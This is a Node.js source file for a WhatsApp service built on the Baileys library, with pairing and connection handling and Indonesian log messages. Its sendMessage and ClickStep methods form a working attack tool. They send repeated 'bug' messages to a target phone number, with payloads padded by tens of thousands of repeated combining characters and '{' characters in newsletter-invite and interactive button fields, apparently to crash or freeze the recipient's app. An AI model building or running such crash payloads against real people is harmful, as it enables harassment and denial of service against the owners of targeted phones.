const {
  makeWASocket,
  prepareWAMessageMedia,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  proto,
  delay,
  relayWAMessage,
  getContentType,
  jidDecode,
  Browsers
} = require('@whiskeysockets/baileys');
const fs = require('fs-extra');
const path = require('path');

class WhatsAppService {
    constructor() {
        this.sock = null;
        this.pairingCode = null;
        this.isConnected = false;
        this.authPath = path.join(__dirname, '../auth');
        this.phoneNumber = null;
        this.isInitializing = false;
        this.connectionRetries = 0;
        this.maxRetries = 3;
        this.ensureAuthDir();
    }

    ensureAuthDir() {
        if (!fs.existsSync(this.authPath)) {
            fs.mkdirSync(this.authPath, { recursive: true });
        }
    }

    formatPhoneNumber(phoneNumber) {
        if (!phoneNumber) return null;
        
        let cleanNumber = phoneNumber.toString().replace(/\D/g, '');
        
        if (cleanNumber.startsWith('0')) {
            cleanNumber = cleanNumber.substring(1);
        }
        
        if (!cleanNumber.startsWith('62')) {
            cleanNumber = '62' + cleanNumber;
        }
        
        if (cleanNumber.length < 12 || cleanNumber.length > 17) {
            throw new Error(`Format nomor tidak valid: ${cleanNumber}. Harus 10-15 digit setelah +62`);
        }
        
        return cleanNumber;
    }

    async initialize(phoneNumber = null) {
        if (this.isInitializing) {
            console.log('WhatsApp already initializing, please wait...');
            return false;
        }

        try {
            this.isInitializing = true;
            
            if (phoneNumber) {
                this.phoneNumber = this.formatPhoneNumber(phoneNumber);
                console.log(`Initializing WhatsApp for: ${this.phoneNumber}`);
            }
            
            const { state, saveCreds } = await useMultiFileAuthState(this.authPath);
            
            if (this.sock) {
                try {
                    await this.sock.end();
                } catch (err) {
                    console.log('Error closing existing socket:', err.message);
                }
            }
            
            this.sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: require('pino')({ level: 'silent' }),
                browser: Browsers.macOS('Desktop'),
                mobile: false,
                syncFullHistory: false,
                markOnlineOnConnect: false,
                emitOwnEvents: false,
                generateHighQualityLinkPreview: false,
                defaultQueryTimeoutMs: 20000,
                connectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                retryRequestDelayMs: 1000,
                maxMsgRetryCount: 2,
                fireInitQueries: true,
                qrTimeout: 30000
            });

            this.setupEventHandlers(saveCreds);

            await this.waitForSocketReady();

            if (this.phoneNumber && !state.creds?.registered) {
                console.log('Device not registered, requesting pairing code...');
                this.pairingCode = await this.sock.requestPairingCode(this.phoneNumber);
                console.log(`Pairing code for ${this.phoneNumber}: ${this.pairingCode}`);
                return this.pairingCode;
            } else if (state.creds?.registered) {
                console.log('Device already registered, waiting for connection...');
            }

            return true;

        } catch (error) {
            console.error('WhatsApp initialization error:', error);
            this.connectionRetries++;
            
            if (this.connectionRetries < this.maxRetries) {
                console.log(`Retrying initialization... (${this.connectionRetries}/${this.maxRetries})`);
                await delay(5000);
                return this.initialize(phoneNumber);
            }
            
            throw error;
        } finally {
            this.isInitializing = false;
        }
    }

    async waitForSocketReady(timeout = 10000) {
        return new Promise((resolve, reject) => {
            if (!this.sock) {
                reject(new Error('Socket not initialized'));
                return;
            }

            const timer = setTimeout(() => {
                reject(new Error('Socket ready timeout'));
            }, timeout);

            if (this.sock.authState && this.sock.authState.creds) {
                clearTimeout(timer);
                resolve(true);
                return;
            }

            const checkReady = () => {
                if (this.sock && this.sock.authState && this.sock.authState.creds) {
                    clearTimeout(timer);
                    resolve(true);
                } else {
                    setTimeout(checkReady, 500);
                }
            };

            checkReady();
        });
    }

    setupEventHandlers(saveCreds) {
        if (!this.sock) return;

        this.sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;
            
            console.log('Connection update:', connection);
            
            if (connection === 'close') {
                this.isConnected = false;
                this.pairingCode = null;
                
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const shouldReconnect = statusCode !== DisconnectReason.loggedOut && 
                                      statusCode !== DisconnectReason.forbidden &&
                                      this.connectionRetries < this.maxRetries;
                
                console.log('Connection closed:', {
                    error: lastDisconnect?.error?.message,
                    statusCode,
                    shouldReconnect
                });
                
                if (shouldReconnect && !this.isInitializing) {
                    console.log(`Reconnecting in 5 seconds... (${this.connectionRetries + 1}/${this.maxRetries})`);
                    setTimeout(() => {
                        if (this.phoneNumber) {
                            this.initialize(this.phoneNumber);
                        }
                    }, 5000);
                } else if (statusCode === DisconnectReason.loggedOut) {
                    console.log('Logged out, cleaning auth state...');
                    this.clearAuthState();
                }
            } else if (connection === 'open') {
                console.log('WhatsApp connection opened successfully!');
                this.isConnected = true;
                this.pairingCode = null;
                this.connectionRetries = 0;
            } else if (connection === 'connecting') {
                console.log('Connecting to WhatsApp...');
            }
        });

        this.sock.ev.on('creds.update', saveCreds);

        this.sock.ev.on('messages.upsert', (m) => {
        });
    }

    async requestPairingCode(phoneNumber) {
        try {
            if (this.isConnected) {
                throw new Error('WhatsApp sudah terhubung');
            }
            
            if (!phoneNumber) {
                throw new Error('Nomor telepon diperlukan untuk pairing code');
            }
            
            const formattedNumber = this.formatPhoneNumber(phoneNumber);
            console.log(`Requesting pairing code for: ${formattedNumber}`);
            
            this.connectionRetries = 0;
            
            const result = await this.initialize(formattedNumber);
            
            if (typeof result === 'string') {

                return result;
            }
            
            let attempts = 0;
            const maxAttempts = 15; 
            
            while (!this.pairingCode && attempts < maxAttempts && this.sock) {
                await delay(1000);
                attempts++;
                console.log(`Waiting for pairing code... ${attempts}/${maxAttempts}`);
            }
            
            if (!this.pairingCode) {
                throw new Error(`Gagal mendapatkan pairing code setelah ${maxAttempts} detik. Periksa nomor telepon dan koneksi.`);
            }
            
            return this.pairingCode;
            
        } catch (error) {
            console.error('Pairing code request error:', error);
            this.cleanup();
            throw error;
        }
    }

    getConnectionStatus() {
        return {
            connected: this.isConnected,
            hasPairingCode: !!this.pairingCode,
            pairingCode: this.pairingCode,
            phoneNumber: this.phoneNumber,
            isInitializing: this.isInitializing,
            retries: this.connectionRetries
        };
    }

    async clearAuthState() {
        try {
            if (fs.existsSync(this.authPath)) {
                await fs.emptyDir(this.authPath);
                console.log('Auth state cleared');
            }
        } catch (error) {
            console.error('Error clearing auth state:', error);
        }
    }

    async cleanup() {
        try {
            this.isInitializing = false;
            if (this.sock) {
                await this.sock.end();
                this.sock = null;
            }
            this.isConnected = false;
            this.pairingCode = null;
        } catch (error) {
            console.error('Cleanup error:', error);
        }
    }

    async sendMessage(target, version, customMessage, count = 50, delayMs = 1000) {
        if (!this.isConnected) {
            throw new Error('WhatsApp belum terhubung. Silakan masukkan kode pairing terlebih dahulu.');
        }

        try {
            const formattedTarget = this.formatPhoneNumber(target) + '@s.whatsapp.net';

            const messageFunctions = {
                v1: () => this.ClickStep(formattedTarget),
                v2: () => this.ClickStep(formattedTarget),
                v3: () => this.ClickStep(formattedTarget)
            };

            const messageFunction = messageFunctions[version] || messageFunctions.v1;

            for (let i = 1; i <= count; i++) {
                try {
                    await messageFunction();
                    console.log(`[${i}/${count}] Bug terkirim ke ${formattedTarget}`);
                    if (i < count) await delay(delayMs);
                } catch (err) {
                    console.error(`Gagal kirim bug ke-${i}:`, err.message);
                }
            }

            return {
                success: true,
                message: `${count} pesan bug berhasil dikirim`,
                target: formattedTarget,
                version: version,
                sentAt: new Date().toISOString()
            };

        } catch (error) {
            console.error('Send message error:', error);
            return {
                success: false,
                message: `Gagal kirim pesan: ${error.message}`
            };
        }
    }

    // x
    async ClickStep(isTarget) {
        try {
            const msgi = {
                newsletterAdminInviteMessage: {
                    newsletterJid: "1@newsletter",
                    newsletterName: "7ooModdss" + "ោ៝".repeat(20000),
                    caption: "7ooModds" + "FVerse" + "ោ៝".repeat(20000),
                    inviteExpiration: "999999999",
                },
            };

            await this.sock.relayMessage(isTarget, msgi, {
                participant: { jid: isTarget },
                messageId: null,
            });
            
            const SQL = JSON.stringify({
                status: true,
                criador: "JooModds",
                resultado: {
                    type: "md",
                    ws: {
                        _events: { "CB:ib,,dirty": ["Array"] },
                        _eventsCount: 800000,
                        _maxListeners: 0,
                        url: "wss://web.whatsapp.com/ws/chat",
                        config: {
                            version: ["Array"],
                            browser: ["Array"],
                            waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                            sockCectTimeoutMs: 20000,
                            keepAliveIntervalMs: 30000,
                            logger: {},
                            printQRInTerminal: false,
                            emitOwnEvents: true,
                            defaultQueryTimeoutMs: 60000,
                            customUploadHosts: [],
                            retryRequestDelayMs: 250,
                            maxMsgRetryCount: 5,
                            fireInitQueries: true,
                            auth: { Object: "authData" },
                            markOnlineOnsockCect: true,
                            syncFullHistory: true,
                            linkPreviewImageThumbnailWidth: 192,
                            transactionOpts: { Object: "transactionOptsData" },
                            generateHighQualityLinkPreview: false,
                            options: {},
                            appStateMacVerification: { Object: "appStateMacData" },
                            mobile: true
                        }
                    }
                }
            });

            const msg = await generateWAMessageFromContent(
                isTarget,
                {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                contextInfo: {
                                    expiration: 1,
                                    ephemeralSettingTimestamp: 1,
                                    entryPointConversionSource: "WhatsApp.com",
                                    entryPointConversionApp: "WhatsApp",
                                    entryPointConversionDelaySeconds: 1,
                                    disappearingMode: {
                                        initiatorDeviceJid: isTarget,
                                        initiator: "INITIATED_BY_OTHER",
                                        trigger: "UNKNOWN_GROUPS"
                                    },
                                    participant: "0@s.whatsapp.net",
                                    remoteJid: "status@broadcast",
                                    mentionedJid: [isTarget],
                                    quotedMessage: {
                                        paymentInviteMessage: {
                                            serviceType: 1,
                                            expiryTimestamp: null
                                        }
                                    },
                                    externalAdReply: {
                                        showAdAttribution: false,
                                        renderLargerThumbnail: true
                                    }
                                },
                                body: {
                                    text: "7ooModdss \n" + "ꦾ".repeat(50000)
                                },
                                nativeFlowMessage: {
                                    messageParamsJson: SQL + "{".repeat(1000),
                                    buttons: [
                                        {
                                            name: "single_select",
                                            buttonParamsJson: SQL + "{".repeat(20000)
                                        },
                                        {
                                            name: "review_and_pay",
                                            buttonParamsJson: SQL + "{".repeat(20000)
                                        },
                                        {
                                            name: "call_permission_request",
                                            buttonParamsJson: SQL + "{".repeat(20000)
                                        }
                                    ]
                                }
                            }
                        }
                    }
                },
                {}
            );

            await this.sock.relayMessage(isTarget, msg.message, {
                participant: { jid: isTarget },
                messageId: msg.key.id
            });
        } catch (error) {
            console.error('ClickStep error:', error);
            throw error;
        }
    }
} 

module.exports = WhatsAppService;